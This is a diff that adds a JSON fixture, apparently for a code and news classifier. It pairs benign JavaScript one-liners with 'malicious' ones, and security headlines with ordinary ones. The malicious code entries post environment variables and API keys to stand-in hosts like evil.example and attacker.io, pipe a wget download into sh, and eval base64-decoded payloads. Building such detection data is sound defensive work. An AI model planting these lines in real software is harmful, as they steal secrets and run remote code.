@@ -1,0 +1,78 @@
+{
+  "code": {
+    "benign": [
+      "export function add(a, b) { return a + b; }",
+      "const express = require(\"express\"); app.get(\"/\", (req, res) => res.send(\"ok\"));",
+      "import { readFile } from \"node:fs/promises\"; export async function load(path) { return readFile(path, \"utf8\"); }",
+      "module.exports = { validateEmail(email) { return /^[^@]+@[^@]+$/.test(email); } };",
+      "function formatDate(d) { return d.toISOString().slice(0, 10); }",
+      "export const VERSION = \"1.0.0\";",
+      "const debounce = (fn, ms) => { let t; return (...args) => { clearTimeout(t); t = setTimeout(() => fn(...args), ms); }; };",
+      "class Queue { constructor() { this.items = []; } push(item) { this.items.push(item); } pop() { return this.items.shift(); } }",
+      "export function slugify(value) { return value.trim().toLowerCase().replace(/\\s+/g, \"-\"); }",
+      "import crypto from \"node:crypto\"; export const hash = (input) => crypto.createHash(\"sha256\").update(input).digest(\"hex\");",
+      "const users = new Map(); export function getUser(id) { return users.get(id) ?? null; }",
+      "export async function ping(url) { const response = await fetch(url, { method: \"HEAD\" }); return response.ok; }",
+      "module.exports = function isPlainObject(value) { return Object.prototype.toString.call(value) === \"[object Object]\"; };",
+      "export function clamp(value, min, max) { return Math.min(max, Math.max(min, value)); }",
+      "const tokenPattern = /^[a-z0-9._-]+$/i; export function isToken(value) { return tokenPattern.test(value); }",
+      "import { createServer } from \"node:http\"; createServer((req, res) => { res.end(\"ok\"); }).listen(3000);",
+      "export const middleware = (req, _res, next) => { req.id = crypto.randomUUID(); next(); };",
+      "const schema = z.object({ email: z.string().email() }); export function parseUser(input) { return schema.parse(input); }",
+      "export function mergeDefaults(target, defaults) { return { ...defaults, ...target }; }",
+      "const cache = new LRUCache({ max: 500 }); export function memoize(key, value) { cache.set(key, value); }"
+    ],
+    "malicious": [
+      "eval(Buffer.from(\"YWRlcnQoMSk=\", \"base64\").toString());",
+      "const cp = require(\"child_process\"); cp.exec(process.env.SECRET);",
+      "fetch(\"https://evil.example/collect\", { method: \"POST\", body: JSON.stringify(process.env) });",
+      "new Function(\"return \" + atob(\"ZXZhbCgxKQ==\"))();",
+      "require(\"child_process\").spawn(\"curl\", [\"-d\", process.env.API_KEY, \"https://attacker.io\"]);",
+      "const data = process.env; require(\"https\").request(\"https://bad.io\", { method: \"POST\" }).end(JSON.stringify(data));",
+      "eval(\"require(\\\"child_process\\\").exec(\\\"wget http://x/p.sh|sh\\\")\");",
+      "Buffer.from(\"cHJvY2Vzcy5lbnY=\", \"base64\").toString(); fetch(process.env.WEBHOOK);",
+      "require(\"child_process\").execSync(\"powershell -enc \" + process.env.PAYLOAD);",
+      "const secret = process.env.API_KEY; fetch(\"https://evil.example/collect\", { method: \"POST\", body: JSON.stringify(secret) });",
+      "spawn(\"curl\", [\"-X\", \"POST\", \"-d\", JSON.stringify(process.env), \"https://attacker.io/exfil\"]);",
+      "atob(\"Y29uc29sZS5sb2coInNlY3JldCIp\"); fetch(process.env.WEBHOOK, { method: \"POST\", body: process.env.HOME });",
+      "require(\"child_process\").spawnSync(\"wget\", [process.env.C2_URL]); eval(Buffer.from(process.env.PAYLOAD, \"base64\").toString());",
+      "https.request({ hostname: \"evil.io\", method: \"POST\" }, () => {}).end(JSON.stringify({ env: process.env }));",
+      "exec(process.env.INSTALL_SCRIPT); fetch(\"https://discord.com/api/webhooks/abc\", { method: \"POST\", body: JSON.stringify(process.env) });",
+      "require(\"child_process\").exec(\"curl -d \" + JSON.stringify(process.env) + \" https://attacker.io\");",
+      "globalThis[atob(\"ZXZhbA==\")](Buffer.from(process.env.PAYLOAD, \"base64\").toString());",
+      "fetch(process.env.EXFIL_URL, { method: \"POST\", body: Buffer.from(JSON.stringify(process.env)).toString(\"base64\") });",
+      "require(\"https\").get(process.env.C2 + \"?d=\" + encodeURIComponent(JSON.stringify(process.env)));",
+      "new Function(atob(\"cHJvY2Vzcy5lbnY=\"))(); fetch(process.env.WEBHOOK);"
+    ]
+  },
+  "news": {
+    "malicious": [
+      "Critical vulnerability RCE in npm package lodash exploited in the wild",
+      "Malware found in npm supply chain attack compromises thousands of projects",
+      "CVE-2024-1234 remote code execution patch immediately",
+      "Security advisory typosquat backdoor discovered in popular library",
+      "npm package compromised with credential stealer in postinstall script",
+      "Zero-day exploit in dependency chain triggers emergency npm advisory",
+      "Threat actors publish malicious package mimicking axios on npm registry",
+      "Supply chain attack spreads via hijacked maintainer account on npm",
+      "Researchers warn of wormable npm malware spreading via typosquatting campaign",
+      "GitHub advisory: malicious versions of eslint-config copied env secrets",
+      "OpenSSF flags coordinated npm attack targeting CI environment variables",
+      "Emergency patch for critical RCE in widely used webpack plugin"
+    ],
+    "benign": [
+      "How to improve your JavaScript coding style this summer",
+      "Top 10 frontend frameworks opinion piece for beginners",
+      "Company announces new office location and hiring plans",
+      "Weekly digest of open source community events",
+      "Interview with maintainers about documentation best practices",
+      "Release notes for eslint 9 and prettier integration tips",
+      "Conference recap: workshops on testing and developer productivity",
+      "Opinion: why monorepos help large teams collaborate better",
+      "New React 19 features explained for application developers",
+      "Guide to setting up Vitest with TypeScript in 2026",
+      "Maintainers share roadmap for documentation and DX improvements",
+      "Community spotlight: local meetups and contributor onboarding tips"
+    ]
+  }
+}
